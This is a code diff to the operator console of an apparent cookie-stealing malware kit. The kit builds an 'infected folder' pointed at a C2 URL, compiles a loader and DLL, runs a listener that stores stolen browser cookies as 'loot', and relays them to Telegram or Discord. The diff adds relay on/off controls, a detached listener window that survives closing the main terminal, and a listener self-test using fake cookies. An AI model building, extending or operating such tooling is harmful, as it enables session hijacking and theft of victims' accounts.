@@ -313,10 +313,13 @@ def build_infected_folder(host_dir, c2_url, persist=False):
 
 def start_listener(port, telegram=None, discord=None):
     """Start listen.py in background. Returns the process handle.
-    If telegram or discord are provided, listen.py relays received cookies to them."""
+    If telegram or discord are provided, listen.py relays received cookies to them.
+    Uses CREATE_NEW_CONSOLE so the listener has its own window (can't be killed by
+    closing the main terminal). Output is also written to loot/listener.log."""
     os.makedirs(LOOT, exist_ok=True)
     # clean old loot
-    for f in ["cookies.json", "cookies.txt"]:
+    for f in ["cookies.json", "cookies.txt", "session_cookies.json", "session_cookies.txt",
+              "listener.log"]:
         p = os.path.join(LOOT, f)
         if os.path.exists(p):
             os.remove(p)
@@ -562,8 +565,12 @@ def pick_gui():
             cfg_new = load_config()
             if tg_val:
                 cfg_new["telegram"] = tg_val
+            else:
+                cfg_new.pop("telegram", None)
             if dc_val:
                 cfg_new["discord"] = dc_val
+            else:
+                cfg_new.pop("discord", None)
             cfg_new["persist"] = bool(persist_var.get())
             save_config(cfg_new)
 
@@ -585,33 +592,98 @@ def pick_gui():
 
         # --- Relay config section ---
         ttk.Separator(root).pack(fill="x", padx=40, pady=(12, 5))
-        ttk.Label(root, text="Relay (optional -- saved to config.json)",
+        relay_header = tk.Frame(root, bg="#1a1a1a")
+        relay_header.pack(fill="x", padx=40, pady=(0, 5))
+        ttk.Label(relay_header, text="Relay (saved to config.json)",
                   font=("Segoe UI", 9, "bold"),
-                  foreground="#4a9eff").pack(pady=(0, 5))
+                  foreground="#4a9eff").pack(side="left")
 
-        # Telegram
+        def save_relay():
+            """Save relay fields to config.json without closing the window."""
+            tg_val = tg_var.get().strip()
+            dc_val = dc_var.get().strip()
+            cfg_new = load_config()
+            if tg_val:
+                cfg_new["telegram"] = tg_val
+            else:
+                cfg_new.pop("telegram", None)
+            if dc_val:
+                cfg_new["discord"] = dc_val
+            else:
+                cfg_new.pop("discord", None)
+            cfg_new["persist"] = bool(persist_var.get())
+            save_config(cfg_new)
+            # Update status labels
+            if tg_val:
+                tg_status.config(text="ON", foreground="#4a9eff")
+            else:
+                tg_status.config(text="OFF", foreground="#666666")
+            if dc_val:
+                dc_status.config(text="ON", foreground="#4a9eff")
+            else:
+                dc_status.config(text="OFF", foreground="#666666")
+            save_status.config(text="saved!", foreground="#4a9eff")
+            root.after(2000, lambda: save_status.config(text=""))
+
+        def toggle_tg():
+            """Toggle Telegram relay on/off (clears the field to disable)."""
+            if tg_var.get().strip():
+                # Has value -> clear it (disable)
+                tg_var.set("")
+                tg_status.config(text="OFF", foreground="#666666")
+            else:
+                # Empty -> restore from config if available
+                saved = load_config().get("telegram", "")
+                if saved:
+                    tg_var.set(saved)
+                    tg_status.config(text="ON", foreground="#4a9eff")
+                else:
+                    tg_status.config(text="set key first", foreground="#cc6600")
+
+        def toggle_dc():
+            """Toggle Discord relay on/off."""
+            if dc_var.get().strip():
+                dc_var.set("")
+                dc_status.config(text="OFF", foreground="#666666")
+            else:
+                saved = load_config().get("discord", "")
+                if saved:
+                    dc_var.set(saved)
+                    dc_status.config(text="ON", foreground="#4a9eff")
+                else:
+                    dc_status.config(text="set key first", foreground="#cc6600")
+
+        # Telegram row
         tg_frame = tk.Frame(root, bg="#1a1a1a")
         tg_frame.pack(fill="x", padx=40, pady=2)
-        ttk.Label(tg_frame, text="Telegram:", width=12).pack(side="left")
+        ttk.Label(tg_frame, text="Telegram:", width=10).pack(side="left")
         tg_var = tk.StringVar(value=cfg.get("telegram", "") or "")
-        # Mask the token if loaded from config
-        tg_display = tg_var.get()
-        tg_entry = ttk.Entry(tg_frame, textvariable=tg_var, width=48)
-        tg_entry.pack(side="left", fill="x", expand=True, padx=(4, 0))
-        if tg_display:
-            ttk.Label(tg_frame, text="  (saved)",
-                      foreground="#4a9eff").pack(side="left")
+        ttk.Entry(tg_frame, textvariable=tg_var, width=38).pack(side="left", fill="x", expand=True, padx=(4, 4))
+        tg_status = tk.Label(tg_frame, text="ON" if tg_var.get() else "OFF",
+                             bg="#1a1a1a", fg="#4a9eff" if tg_var.get() else "#666666",
+                             font=("Segoe UI", 8, "bold"), width=5)
+        tg_status.pack(side="left")
+        ttk.Button(tg_frame, text="Toggle", width=6, command=toggle_tg).pack(side="left", padx=(4, 0))
 
-        # Discord
+        # Discord row
         dc_frame = tk.Frame(root, bg="#1a1a1a")
         dc_frame.pack(fill="x", padx=40, pady=2)
-        ttk.Label(dc_frame, text="Discord:", width=12).pack(side="left")
+        ttk.Label(dc_frame, text="Discord:", width=10).pack(side="left")
         dc_var = tk.StringVar(value=cfg.get("discord", "") or "")
-        dc_entry = ttk.Entry(dc_frame, textvariable=dc_var, width=48)
-        dc_entry.pack(side="left", fill="x", expand=True, padx=(4, 0))
-        if dc_var.get():
-            ttk.Label(dc_frame, text="  (saved)",
-                      foreground="#4a9eff").pack(side="left")
+        ttk.Entry(dc_frame, textvariable=dc_var, width=38).pack(side="left", fill="x", expand=True, padx=(4, 4))
+        dc_status = tk.Label(dc_frame, text="ON" if dc_var.get() else "OFF",
+                             bg="#1a1a1a", fg="#4a9eff" if dc_var.get() else "#666666",
+                             font=("Segoe UI", 8, "bold"), width=5)
+        dc_status.pack(side="left")
+        ttk.Button(dc_frame, text="Toggle", width=6, command=toggle_dc).pack(side="left", padx=(4, 0))
+
+        # Save button + status
+        save_frame = tk.Frame(root, bg="#1a1a1a")
+        save_frame.pack(fill="x", padx=40, pady=(4, 0))
+        ttk.Button(save_frame, text="SAVE RELAY SETTINGS", command=save_relay).pack(side="left")
+        save_status = tk.Label(save_frame, text="", bg="#1a1a1a", fg="#4a9eff",
+                               font=("Segoe UI", 9))
+        save_status.pack(side="left", padx=(8, 0))
 
         # Persistence checkbox
         persist_frame = tk.Frame(root, bg="#1a1a1a")
@@ -651,6 +723,7 @@ def print_help():
     log("  RELAY:")
     log("    telegram <token:chat> Set Telegram relay (saved to config)")
     log("    discord <webhook_url> Set Discord relay (saved to config)")
+    log("    relay                 Show relay status (active/off)")
     log("    clear-telegram        Remove saved Telegram token")
     log("    clear-discord         Remove saved Discord webhook")
     log("")
@@ -660,9 +733,10 @@ def print_help():
     log("    config                Show current saved configuration")
     log("    tg-chatid <token>     Find your Telegram chat ID")
     log("")
-    log("  BUILD:")
+    log("  BUILD / TEST:")
     log("    build                 Compile loader.exe + ckdll.dll (needs MSVC)")
     log("    install               Run install.bat (dependency installer)")
+    log("    test-listener         Start listener + send fake cookies (verify it works)")
     log("")
     log("  HELP:")
     log("    help                  Show this command list")
@@ -796,6 +870,49 @@ def interactive_loop():
         elif cmd == "install":
             log("[*] running install.bat...")
             subprocess.call(["cmd", "/c", "install.bat"], cwd=HERE)
+
+        elif cmd == "test-listener":
+            # Start listener on a test port and send fake cookies
+            test_port = port
+            log("[*] starting listener on port %d for test..." % test_port)
+            listener = start_listener(test_port, telegram, discord)
+            if not listener:
+                log("[-] could not start listener")
+                continue
+            time.sleep(1)
+            try:
+                fake = '[{"domain":"test.com","name":"test_cookie","value":"abc123","path":"/","expirationDate":0,"sameSite":"None","secure":false,"httpOnly":false,"hostOnly":true,"session":true}]'
+                import urllib.request as ur
+                req = ur.Request("http://127.0.0.1:%d/" % test_port,
+                                 data=fake.encode(),
+                                 headers={"Content-Type": "application/json"})
+                resp = ur.urlopen(req, timeout=5)
+                log("[+] listener test: HTTP %d %s" % (resp.status, resp.read().decode()))
+                # Check if loot was written
+                jp = os.path.join(LOOT, "cookies.json")
+                if os.path.exists(jp) and os.path.getsize(jp) > 10:
+                    log("[+] loot/cookies.json written (%d bytes)" % os.path.getsize(jp))
+                    sp = os.path.join(LOOT, "session_cookies.json")
+                    if os.path.exists(sp):
+                        log("[+] loot/session_cookies.json written (%d bytes)" % os.path.getsize(sp))
+                    log("[+] listener is working!")
+                else:
+                    log("[-] listener responded but no loot file written")
+            except Exception as ex:
+                log("[-] listener test failed: %s" % ex)
+            listener.terminate()
+
+        elif cmd == "relay":
+            # Toggle relay on/off (doesn't clear saved keys, just enables/disables)
+            if not telegram and not discord:
+                log("[-] no relay configured. Use 'telegram <token:chat>' or 'discord <url>' first.")
+            else:
+                # Show current state
+                log("  Telegram: %s" % ("active" if telegram else "off"))
+                log("  Discord:  %s" % ("active" if discord else "off"))
+                log("  to disable: clear-telegram / clear-discord")
+                log("  to re-enable: telegram <token:chat> / discord <url>")
+                log("  (keys are saved in config.json, just re-enter to re-activate)")
 
         elif cmd == "gui":
             # Launch GUI picker, then run the full flow
